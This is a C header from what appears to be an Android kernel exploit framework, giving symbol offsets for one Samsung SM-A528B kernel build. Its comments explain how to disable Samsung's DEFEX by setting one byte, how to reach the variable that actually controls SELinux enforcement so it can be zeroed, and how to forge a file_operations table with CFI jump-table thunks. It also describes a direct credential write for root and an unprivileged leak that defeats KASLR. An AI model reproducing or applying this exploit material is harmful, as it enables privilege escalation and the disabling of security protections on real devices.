/* targets/kernel/a52sxq-A528BXXSBGYI3.h — symbol offsets for one kernel image.
 *
 * Samsung SM-A528B ("a52sxq"), build A528BXXSBGYI3, kernel
 * 5.4.254-qgki-28575149-abA528BXXSBGYI3. A vendor (non-GKI) kernel: no
 * android14-6.1/android15-6.6 KMI, no CONFIG_DEBUG_INFO_BTF. See
 * ../kmi/qgki-5.4.h for the structure-layout half this pairs with, and
 * ../README.md for the two-layer model.
 *
 * Derived from the raw kernel Image and a live kallsyms capture. The image
 * carries IKCONFIG but no BTF, so the matching qgki-5.4 KMI supplies the
 * struct page size used to calculate VMEMMAP_START. Re-derive with
 * derive_offsets.py and --defines cves/targets/kmi/qgki-5.4.h.
 *
 * Rows that could not come from that tool as-is -- needing a name fix,
 * manual disassembly, or the relocation table rather than the image's own
 * words -- are noted per row.
 *
 * This image's own embedded IKCONFIG (extracted from the IKCFG_ST/IKCFG_ED
 * span, gzip-decompressed) has CONFIG_UH=y, CONFIG_RKP=y, CONFIG_KDP=y,
 * CONFIG_KDP_CRED=y and CONFIG_KDP_NS=y: Samsung's Kernel Data Protection is
 * compiled into this shipped image. A kernel source tree of matching
 * version and banner (mm/slub.c, drivers/uh/kdp.c) shows what that option
 * does when it is on: mark every page belonging to a kmem_cache named
 * CRED_JAR_RO or TSEC_JAR read-only to the kernel at stage 2, and register
 * offsetof(struct cred, uid/euid/gid/egid/security) and offsetof(struct
 * task_struct, cred) with the hypervisor as the fields it is guarding.
 *
 * Whether that is *why* ROOT_METHOD_CRED_PATCH's direct cred write panics
 * this device is not established -- no captured trap or isolating
 * experiment ties the two together yet, only that the config bit is present
 * and the field list matches what the method writes. Treat it as the
 * leading hypothesis, not a conclusion. */
#ifndef TARGET_KERNEL_A52SXQ_A528BXXSBGYI3_H
#define TARGET_KERNEL_A52SXQ_A528BXXSBGYI3_H

#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
/* Derived from the embedded Image config and KMI struct-page size. */
#define VMEMMAP_START 0xfffffffeffe00000ULL

#define ASHMEM_IOCTL_OFF                  0x00174468ULL
#define ASHMEM_MMAP_OFF                   0x00174ddcULL
#define ASHMEM_OPEN_OFF                   0x00174f80ULL
#define ASHMEM_RELEASE_OFF                0x00174ff8ULL
#define ASHMEM_SHOW_FDINFO_OFF            0x00175114ULL
#define ASHMEM_FOPS_OFF                   0x023ffa68ULL
/* This Image keeps its absolute .data pointers unrelocated: the three words
 * at ashmem_misc (kallsyms 0xffffffc012cb5420) read {0xff, 0, 0} --
 * MISC_DYNAMIC_MINOR, with name and fops still zero. The value lives in an
 * R_AARCH64_RELATIVE entry instead (r_offset 0xffffffc012cb5430 =
 * ashmem_misc + MISCDEVICE_FOPS_OFF, addend 0xffffffc01247fa68 =
 * ashmem_fops), so offset-maps.txt's `findptr ASHMEM_FOPS_OFF 0` rule --
 * which scans the image for a word equal to the pointer -- matches the
 * relocation's addend, not the slot. This row is the relocation's r_offset,
 * relative to KIMAGE_TEXT_BASE. */
#define ASHMEM_MISC_FOPS_OFF              0x02c35430ULL
/* derive_offsets.py's row looks for the symbol "ashmem_compat_ioctl"; this
 * kernel names the function the other word order, "compat_ashmem_ioctl"
 * (drivers/staging/android/ashmem.c). Found directly in kallsyms
 * (0xffffffc0101f4d88, a unique local symbol, no hash suffix). */
#define ASHMEM_COMPAT_IOCTL_OFF           0x00174d88ULL

#define COPY_SPLICE_READ_OFF              0x0051f2c0ULL
#define NOOP_LLSEEK_OFF                   0x004d5b60ULL
/* misc_list: head of the global miscdevice list walked by misc_open(). Only
 * used by the misc_list integrity probe (fops.c, GHOSTLOCK_MISC_AUDIT), not the
 * root chain. kallsyms `d misc_list` minus this build's _text base, i.e. the
 * same KIMAGE_TEXT_BASE-relative convention as every row above. */
#define MISC_LIST_OFF                     0x02d14620ULL
/* Samsung DEFEX master switch: task_defex_enforce() returns ALLOW before every
 * check (creds/safeplace/integrity/immutable) when this is non-zero. It is a
 * `bool __ro_after_init`, so only the physical-write krw can set it -- a module
 * store faults. One byte = 1 disables DEFEX for the whole boot. kallsyms
 * `D boot_state_unlocked` minus this build's _text base. */
#define BOOT_STATE_UNLOCKED_OFF           0x0254a4edULL
#define INIT_TASK_OFF                     0x02ca4480ULL
#define ROOT_TASK_GROUP_OFF               0x02ea1de0ULL
/* selinux_state.enforcing, not .disabled: CONFIG_SECURITY_SELINUX_DEVELOP=y
 * (confirmed in this build's own embedded IKCONFIG) puts `bool enforcing`
 * right after `bool disabled` at offset 0 -- pahole against a matching
 * vmlinux confirms disabled@0/enforcing@1. Present and correctly addressed
 * (avc/ss pointers at struct offset +16/+24 verified against kallsyms
 * across independent boots), but this field is not what this build's own
 * enforcing_enabled()/avc_denied() actually read -- see
 * SELINUX_ENFORCING_SHADOW_OFF below. */
#define SELINUX_ENFORCING_OFF             0x02e8d001ULL
/* This build's enforcing_enabled() and avc_denied() (security/selinux/
 * avc.c) do not read selinux_state.enforcing at all: disassembly of this
 * build's own Image shows both load a plain `int` at this address instead
 * (adrp+ldr against this exact offset from _text, in both functions), and
 * avc_denied() branches its enforce/allow decision on that word being
 * zero/nonzero. The symbol table names it `selinux_enforcing`, a separate
 * global from `selinux_state` -- matching a shadow variable this kernel's
 * KDP (drivers/uh/kdp.h's `selinux_enforcing_va` field) is built to name
 * to a hypervisor for protection, though the exact wiring of that
 * protection is not in this project's kernel source copy. This is the
 * address that actually needs to read zero for enforcement to be off. */
#define SELINUX_ENFORCING_SHADOW_OFF      0x03048c54ULL
#define SELINUX_BLOB_SIZES_OFF            0x0254a4d4ULL
#define SECURITY_HOOK_HEADS_OFF           0x02549e60ULL
#define KMALLOC_CACHES_OFF                0x025499b8ULL
#define ANON_PIPE_BUF_OPS_OFF             0x02427df8ULL
#define LINUX_BANNER_OFF                  0x0240eeecULL
#define INPUT_DEV_LIST_OFF                0x02d6f408ULL
#define SYSTEM_UNBOUND_WQ_OFF             0x02bafa20ULL
#define SLIDE_NFULNL_LOGGER_OFF           0x02baaad8ULL
#define SLIDE_SYSCTL_BOOTID_OFF           0x030dedf9ULL
#define SLIDE_LOGGERS_0_1_OFF             0x02bb3958ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF     0x02d14510ULL

/* tracing_mark_write is compiled here as a local symbol with a compiler
 * disambiguation suffix, "tracing_mark_write$<hash>" -- the bare name the
 * general rule looks for does not exist on this build. Two such suffixed
 * candidates exist; the self-addr rule's own uniqueness check (exactly one
 * adrp/add pair pointing back into the function) picks the right one and
 * rejects the other (2 such pairs, not 1). The unprivileged tracefs leak
 * using this constant reproduces the exact _text address the live kallsyms
 * row above reports, from uid=2000, with no root required. */
#define SLIDE_TRACE_MARK_IP_OFF           0x003bb2b8ULL

/* configfs_read_file / configfs_write_file -- the pre-5.13 (this kernel
 * predates the iter conversion) .read/.write slot functions; see
 * CONFIGFS_RW_SLOT_READ in ../kmi/qgki-5.4.h. Compiled as local symbols with
 * a compiler disambiguation suffix; each has exactly one candidate in
 * kallsyms (no ambiguity, unlike tracing_mark_write).
 *
 * The PLAIN pair, not the _bin_ pair. Both bin forms open with to_frag(file)
 * -- file->f_path.dentry->d_fsdata->s_frag -- and the descriptor this gadget
 * is driven through is an ashmem one, whose dentry carries no d_fsdata, so
 * that dereference faults before private_data is read at all: the fault
 * occurs inside configfs_read_bin_file+0x3c, called from __vfs_read+0x20.
 * Both plain forms
 * open at private_data (`ldr x25, [x0, #200]`), and the only dentry use left
 * is behind needs_read_fill, which the name blob already clears. */
#define CONFIGFS_READ_ITER_OFF            0x0059e218ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF       0x0059e378ULL

/* Not resolved from this image, and not needed by any target currently
 * built against this KMI: CONFIGFS_READ_ITER/CONFIGFS_BIN_WRITE_ITER's
 * *_iter-shaped counterparts (this kernel predates them -- see above),
 * EP_POLL_CALLBACK_OFF (badepoll/CVE-2026-46242 needs it; not ported here),
 * POSIX_CPU_TIMER_DEL_RACE_OFF (zombietick/CVE-2026-64560; not ported here).
 *
 * Not derivable from an Image at all: slab strides (MM_STRUCT_SZ etc,
 * runtime facts -- harvest-live.sh or /proc/slabinfo) and the memory map
 * (/proc/iomem). Both need the live device; see ../kmi/qgki-5.4.h for what
 * was and was not independently confirmed there.
 */


/* Callable addresses for the forged file_operations table.
 *
 * This build compiles with CFI jump tables: a function-pointer table holds a
 * four-byte thunk (`b <function>`) out of the jump-table region, and an
 * indirect call is checked against the thunk rather than the function body. A
 * forged table carrying bodies aborts the first time anything calls through it
 * -- "Kernel panic: CFI failure (target: ashmem_open+0x0/0x78)" out of
 * misc_open(). Rule: jump-table, [JTMAP] in runner/scripts/lib/offset-maps.txt.
 * Five of these were read back out of the genuine ashmem_fops table on a
 * running kernel and agree exactly.
 */
#define ASHMEM_IOCTL_CALLABLE_OFF            0x0174aadcULL
#define ASHMEM_COMPAT_IOCTL_CALLABLE_OFF     0x0174aae0ULL
#define ASHMEM_MMAP_CALLABLE_OFF             0x0173ca14ULL
#define ASHMEM_OPEN_CALLABLE_OFF             0x0174947cULL
#define ASHMEM_RELEASE_CALLABLE_OFF          0x01749480ULL
#define ASHMEM_SHOW_FDINFO_CALLABLE_OFF      0x0174058cULL
#define CONFIGFS_READ_ITER_CALLABLE_OFF      0x01747978ULL
#define CONFIGFS_BIN_WRITE_ITER_CALLABLE_OFF 0x01749220ULL
#define COPY_SPLICE_READ_CALLABLE_OFF        0x01738b9cULL

#define ASHMEM_IOCTL_CALLABLE         (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_CALLABLE_OFF)
#define ASHMEM_COMPAT_IOCTL_CALLABLE  (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_CALLABLE_OFF)
#define ASHMEM_MMAP_CALLABLE          (KIMAGE_TEXT_BASE + ASHMEM_MMAP_CALLABLE_OFF)
#define ASHMEM_OPEN_CALLABLE          (KIMAGE_TEXT_BASE + ASHMEM_OPEN_CALLABLE_OFF)
#define ASHMEM_RELEASE_CALLABLE       (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_CALLABLE_OFF)
#define ASHMEM_SHOW_FDINFO_CALLABLE   (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_CALLABLE_OFF)
#define CONFIGFS_READ_ITER_CALLABLE   (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_CALLABLE_OFF)
#define CONFIGFS_BIN_WRITE_ITER_CALLABLE (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_CALLABLE_OFF)
#define COPY_SPLICE_READ_CALLABLE     (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_CALLABLE_OFF)

#endif /* TARGET_KERNEL_A52SXQ_A528BXXSBGYI3_H */
